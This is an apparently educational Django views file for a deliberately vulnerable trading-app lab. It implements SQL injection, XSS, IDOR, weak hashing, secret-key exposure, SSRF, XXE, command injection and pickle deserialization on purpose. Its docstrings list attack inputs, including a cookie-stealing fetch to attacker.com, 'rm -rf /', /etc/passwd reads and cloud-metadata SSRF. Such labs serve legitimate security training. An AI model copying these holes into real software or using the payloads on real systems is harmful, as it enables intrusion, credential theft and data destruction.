"""
🔴 VULNERABLE VIEWS - FOR PENETRATION TESTING PRACTICE ONLY
============================================================
DO NOT USE IN PRODUCTION - This code contains intentional vulnerabilities
for learning purposes. Each vulnerability is labeled with its type.

Vulnerabilities included:
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Insecure Direct Object Reference (IDOR)
- Broken Authentication
- Sensitive Data Exposure
- Security Misconfiguration
- Broken Access Control
"""

import json
import sqlite3
import hashlib
import requests
from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.db import connection
from django.conf import settings


# ============================================================
# VULNERABILITY #1: SQL INJECTION
# ============================================================
# Attack: ' OR '1'='1' --
# Attack: ' UNION SELECT username, password FROM auth_user --

@csrf_exempt
def vulnerable_login(request):
    """
    🔴 VULN: SQL Injection in login
    
    How to exploit:
    - Username: admin' --
    - Username: ' OR '1'='1' --
    - Username: ' UNION SELECT id, username, password FROM auth_user --
    
    Why it's vulnerable:
    - User input directly concatenated into SQL query
    - No parameterized queries
    - No input validation
    """
    if request.method == 'POST':
        username = request.POST.get('username', '')
        password = request.POST.get('password', '')
        
        # 🔴 VULNERABLE: Direct string concatenation in SQL
        query = f"SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}'"
        
        with connection.cursor() as cursor:
            cursor.execute(query)  # 🔴 Raw SQL execution
            user = cursor.fetchone()
        
        if user:
            request.session['user_id'] = user[0]
            request.session['username'] = username
            return redirect('/dashboard/')
        
        return render(request, 'vulnerable/login.html', {'error': 'Invalid credentials'})
    
    return render(request, 'vulnerable/login.html')


@csrf_exempt
def vulnerable_search(request):
    """
    🔴 VULN: SQL Injection in search
    
    How to exploit:
    - Search: ' UNION SELECT id, symbol, amount, average_cost, 1, 1 FROM trading_holding --
    - Search: '; DROP TABLE trading_trade; --
    """
    query = request.GET.get('q', '')
    
    # 🔴 VULNERABLE: User input in raw SQL
    sql = f"SELECT * FROM trading_trade WHERE symbol LIKE '%{query}%' OR reason LIKE '%{query}%'"
    
    with connection.cursor() as cursor:
        cursor.execute(sql)
        results = cursor.fetchall()
    
    return JsonResponse({'results': results, 'query': query})


# ============================================================
# VULNERABILITY #2: CROSS-SITE SCRIPTING (XSS)
# ============================================================
# Attack: <script>alert('XSS')</script>
# Attack: <img src=x onerror="alert(document.cookie)">

@csrf_exempt
def vulnerable_profile(request):
    """
    🔴 VULN: Stored XSS in profile
    
    How to exploit:
    - Name: <script>alert('XSS')</script>
    - Bio: <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
    
    Why it's vulnerable:
    - User input rendered without escaping
    - No Content-Security-Policy header
    - No HttpOnly flag on cookies
    """
    if request.method == 'POST':
        name = request.POST.get('name', '')
        bio = request.POST.get('bio', '')
        
        # 🔴 VULNERABLE: Storing unsanitized input
        request.session['profile_name'] = name
        request.session['profile_bio'] = bio
    
    name = request.session.get('profile_name', 'Anonymous')
    bio = request.session.get('profile_bio', 'No bio')
    
    # 🔴 VULNERABLE: Rendering without escaping (using |safe or mark_safe)
    html = f"""
    <html>
    <head><title>Profile</title></head>
    <body>
        <h1>Welcome, {name}</h1>
        <p>Bio: {bio}</p>
        <form method="POST">
            <input name="name" placeholder="Name" value="{name}">
            <textarea name="bio">{bio}</textarea>
            <button type="submit">Update</button>
        </form>
    </body>
    </html>
    """
    return HttpResponse(html)


@csrf_exempt  
def vulnerable_comment(request):
    """
    🔴 VULN: Reflected XSS
    
    How to exploit:
    - URL: /comment/?message=<script>alert('XSS')</script>
    """
    message = request.GET.get('message', '')
    
    # 🔴 VULNERABLE: Reflecting user input directly
    html = f"<html><body><h1>Your message:</h1><p>{message}</p></body></html>"
    return HttpResponse(html)


# ============================================================
# VULNERABILITY #3: INSECURE DIRECT OBJECT REFERENCE (IDOR)
# ============================================================
# Attack: Change user_id in URL to access other users' data

@csrf_exempt
def vulnerable_portfolio(request, user_id):
    """
    🔴 VULN: IDOR - Access any user's portfolio
    
    How to exploit:
    - Login as user 1, then visit /portfolio/2/ to see user 2's data
    - Iterate through /portfolio/1/, /portfolio/2/, etc.
    
    Why it's vulnerable:
    - No authorization check
    - Predictable/enumerable IDs
    """
    # 🔴 VULNERABLE: No check if current user owns this portfolio
    from .models import Portfolio, Trade, Holding
    
    try:
        portfolio = Portfolio.objects.get(id=user_id)
        trades = Trade.objects.filter(portfolio=portfolio)
        holdings = Holding.objects.filter(portfolio=portfolio)
        
        return JsonResponse({
            'balance': float(portfolio.balance),
            'trades': list(trades.values()),
            'holdings': list(holdings.values()),
            # 🔴 VULNERABLE: Exposing sensitive data
            'session_id': portfolio.session_id,
        })
    except Portfolio.DoesNotExist:
        return JsonResponse({'error': 'Not found'}, status=404)


@csrf_exempt
def vulnerable_trade_delete(request, trade_id):
    """
    🔴 VULN: IDOR - Delete any user's trade
    
    How to exploit:
    - Send DELETE request to /trade/delete/123/ for any trade ID
    """
    from .models import Trade
    
    # 🔴 VULNERABLE: No ownership verification
    try:
        trade = Trade.objects.get(id=trade_id)
        trade.delete()
        return JsonResponse({'success': True, 'message': 'Trade deleted'})
    except Trade.DoesNotExist:
        return JsonResponse({'error': 'Not found'}, status=404)


# ============================================================
# VULNERABILITY #4: BROKEN AUTHENTICATION
# ============================================================

@csrf_exempt
def vulnerable_register(request):
    """
    🔴 VULN: Weak password storage & no validation
    
    Why it's vulnerable:
    - MD5 hashing (broken, rainbow tables exist)
    - No salt
    - No password complexity requirements
    - No rate limiting (brute force possible)
    """
    if request.method == 'POST':
        username = request.POST.get('username', '')
        password = request.POST.get('password', '')
        
        # 🔴 VULNERABLE: MD5 is broken, no salt
        password_hash = hashlib.md5(password.encode()).hexdigest()
        
        # 🔴 VULNERABLE: No password complexity check
        # 🔴 VULNERABLE: No username validation
        
        from django.contrib.auth.models import User
        user = User.objects.create(
            username=username,
            password=password_hash  # 🔴 Not using Django's proper hasher
        )
        
        return JsonResponse({'success': True, 'user_id': user.id})
    
    return render(request, 'vulnerable/register.html')


@csrf_exempt
def vulnerable_password_reset(request):
    """
    🔴 VULN: Predictable password reset token
    
    How to exploit:
    - Token is just MD5(username + 'secret')
    - Attacker can generate valid tokens for any user
    """
    if request.method == 'POST':
        username = request.POST.get('username', '')
        
        # 🔴 VULNERABLE: Predictable token generation
        token = hashlib.md5(f"{username}secret".encode()).hexdigest()
        
        # 🔴 VULNERABLE: Token exposed in response
        return JsonResponse({
            'message': 'Reset link sent',
            'debug_token': token  # 🔴 Never expose tokens!
        })
    
    return render(request, 'vulnerable/reset.html')


# ============================================================
# VULNERABILITY #5: SENSITIVE DATA EXPOSURE
# ============================================================

@csrf_exempt
def vulnerable_api_debug(request):
    """
    🔴 VULN: Debug endpoint exposing sensitive info
    
    Why it's vulnerable:
    - Exposes database credentials
    - Exposes secret key
    - Exposes internal paths
    - Should never exist in production
    """
    # 🔴 VULNERABLE: Exposing all settings
    return JsonResponse({
        'debug': settings.DEBUG,
        'secret_key': settings.SECRET_KEY,  # 🔴 CRITICAL!
        'database': str(settings.DATABASES),  # 🔴 CRITICAL!
        'installed_apps': settings.INSTALLED_APPS,
        'middleware': settings.MIDDLEWARE,
    })


@csrf_exempt
def vulnerable_user_export(request):
    """
    🔴 VULN: Mass data exposure
    
    Why it's vulnerable:
    - No authentication required
    - Exports all user data including passwords
    """
    from django.contrib.auth.models import User
    
    # 🔴 VULNERABLE: No auth check, exposing password hashes
    users = User.objects.all().values('id', 'username', 'email', 'password', 'last_login')
    
    return JsonResponse({'users': list(users)})


# ============================================================
# VULNERABILITY #6: SECURITY MISCONFIGURATION
# ============================================================

@csrf_exempt
def vulnerable_file_upload(request):
    """
    🔴 VULN: Unrestricted file upload
    
    How to exploit:
    - Upload a .php or .py file with malicious code
    - Upload a web shell
    - Upload oversized files (DoS)
    
    Why it's vulnerable:
    - No file type validation
    - No size limit
    - Uploaded to web-accessible directory
    - Original filename preserved (path traversal possible)
    """
    if request.method == 'POST' and request.FILES.get('file'):
        uploaded_file = request.FILES['file']
        
        # 🔴 VULNERABLE: No validation, using original filename
        filename = uploaded_file.name  # Could be "../../../etc/passwd"
        
        # 🔴 VULNERABLE: Saving to web-accessible directory
        with open(f'/var/www/uploads/{filename}', 'wb') as f:
            for chunk in uploaded_file.chunks():
                f.write(chunk)
        
        return JsonResponse({
            'success': True,
            'path': f'/uploads/{filename}'  # 🔴 Exposing file path
        })
    
    return render(request, 'vulnerable/upload.html')


@csrf_exempt
def vulnerable_redirect(request):
    """
    🔴 VULN: Open Redirect
    
    How to exploit:
    - /redirect/?url=https://evil-site.com
    - Used in phishing attacks
    """
    url = request.GET.get('url', '/')
    
    # 🔴 VULNERABLE: No URL validation
    return redirect(url)


# ============================================================
# VULNERABILITY #7: XML EXTERNAL ENTITY (XXE)
# ============================================================

@csrf_exempt
def vulnerable_xml_import(request):
    """
    🔴 VULN: XXE Injection
    
    How to exploit:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>
    
    Why it's vulnerable:
    - External entities enabled
    - No input validation
    """
    if request.method == 'POST':
        import xml.etree.ElementTree as ET
        
        xml_data = request.body.decode('utf-8')
        
        # 🔴 VULNERABLE: Parsing XML with external entities
        # In real attack, use defusedxml to prevent this
        root = ET.fromstring(xml_data)
        
        return JsonResponse({'parsed': ET.tostring(root).decode()})
    
    return HttpResponse('Send XML data via POST')


# ============================================================
# VULNERABILITY #8: SERVER-SIDE REQUEST FORGERY (SSRF)
# ============================================================

@csrf_exempt
def vulnerable_fetch_url(request):
    """
    🔴 VULN: SSRF - Server-side request forgery
    
    How to exploit:
    - /fetch/?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
    - /fetch/?url=http://localhost:6379/ (internal Redis)
    - /fetch/?url=file:///etc/passwd (local files)
    
    Why it's vulnerable:
    - No URL validation
    - Can access internal services
    - Can access cloud metadata endpoints
    """
    url = request.GET.get('url', '')
    
    if url:
        try:
            # 🔴 VULNERABLE: Fetching arbitrary URLs
            response = requests.get(url, timeout=10)
            return HttpResponse(response.content)
        except Exception as e:
            return HttpResponse(f"Error: {e}")
    
    return HttpResponse('Provide a URL parameter')


# ============================================================
# VULNERABILITY #9: COMMAND INJECTION
# ============================================================

@csrf_exempt
def vulnerable_ping(request):
    """
    🔴 VULN: OS Command Injection
    
    How to exploit:
    - /ping/?host=google.com; cat /etc/passwd
    - /ping/?host=google.com && whoami
    - /ping/?host=$(whoami)
    
    Why it's vulnerable:
    - User input passed directly to shell
    - No input sanitization
    """
    import subprocess
    
    host = request.GET.get('host', 'localhost')
    
    # 🔴 VULNERABLE: Shell injection
    result = subprocess.run(
        f'ping -c 1 {host}',  # 🔴 User input in shell command
        shell=True,  # 🔴 shell=True is dangerous
        capture_output=True,
        text=True
    )
    
    return HttpResponse(f"<pre>{result.stdout}\n{result.stderr}</pre>")


@csrf_exempt
def vulnerable_backup(request):
    """
    🔴 VULN: Command injection in backup function
    
    How to exploit:
    - /backup/?filename=test; rm -rf /
    - /backup/?filename=test$(whoami)
    """
    import os
    
    filename = request.GET.get('filename', 'backup')
    
    # 🔴 VULNERABLE: Command injection
    os.system(f'tar -czf /backups/{filename}.tar.gz /var/www/data')
    
    return JsonResponse({'message': f'Backup created: {filename}.tar.gz'})


# ============================================================
# VULNERABILITY #10: INSECURE DESERIALIZATION
# ============================================================

@csrf_exempt
def vulnerable_load_session(request):
    """
    🔴 VULN: Insecure deserialization with pickle
    
    How to exploit:
    - Send malicious pickle payload
    - Can lead to Remote Code Execution (RCE)
    
    Why it's vulnerable:
    - pickle.loads() on untrusted data is dangerous
    - Can execute arbitrary code
    """
    import pickle
    import base64
    
    data = request.GET.get('data', '')
    
    if data:
        try:
            # 🔴 VULNERABLE: Deserializing untrusted data
            decoded = base64.b64decode(data)
            obj = pickle.loads(decoded)  # 🔴 CRITICAL: RCE possible
            return JsonResponse({'loaded': str(obj)})
        except Exception as e:
            return JsonResponse({'error': str(e)})
    
    return HttpResponse('Provide base64-encoded pickle data')


# ============================================================
# PRACTICE LAB DASHBOARD
# ============================================================

def vuln_lab_dashboard(request):
    """Dashboard showing all vulnerable endpoints for practice"""
    
    vulnerabilities = [
        {
            'name': 'SQL Injection',
            'endpoints': ['/vuln/login/', '/vuln/search/?q='],
            'severity': 'CRITICAL',
            'owasp': 'A03:2021 - Injection',
        },
        {
            'name': 'Cross-Site Scripting (XSS)',
            'endpoints': ['/vuln/profile/', '/vuln/comment/?message='],
            'severity': 'HIGH',
            'owasp': 'A03:2021 - Injection',
        },
        {
            'name': 'IDOR',
            'endpoints': ['/vuln/portfolio/1/', '/vuln/trade/delete/1/'],
            'severity': 'HIGH',
            'owasp': 'A01:2021 - Broken Access Control',
        },
        {
            'name': 'Broken Authentication',
            'endpoints': ['/vuln/register/', '/vuln/password-reset/'],
            'severity': 'CRITICAL',
            'owasp': 'A07:2021 - Auth Failures',
        },
        {
            'name': 'Sensitive Data Exposure',
            'endpoints': ['/vuln/debug/', '/vuln/users/export/'],
            'severity': 'CRITICAL',
            'owasp': 'A02:2021 - Crypto Failures',
        },
        {
            'name': 'Security Misconfiguration',
            'endpoints': ['/vuln/upload/', '/vuln/redirect/?url='],
            'severity': 'MEDIUM',
            'owasp': 'A05:2021 - Misconfiguration',
        },
        {
            'name': 'SSRF',
            'endpoints': ['/vuln/fetch/?url='],
            'severity': 'HIGH',
            'owasp': 'A10:2021 - SSRF',
        },
        {
            'name': 'Command Injection',
            'endpoints': ['/vuln/ping/?host=', '/vuln/backup/?filename='],
            'severity': 'CRITICAL',
            'owasp': 'A03:2021 - Injection',
        },
        {
            'name': 'Insecure Deserialization',
            'endpoints': ['/vuln/load-session/?data='],
            'severity': 'CRITICAL',
            'owasp': 'A08:2021 - Integrity Failures',
        },
    ]
    
    return render(request, 'vulnerable/dashboard.html', {'vulnerabilities': vulnerabilities})
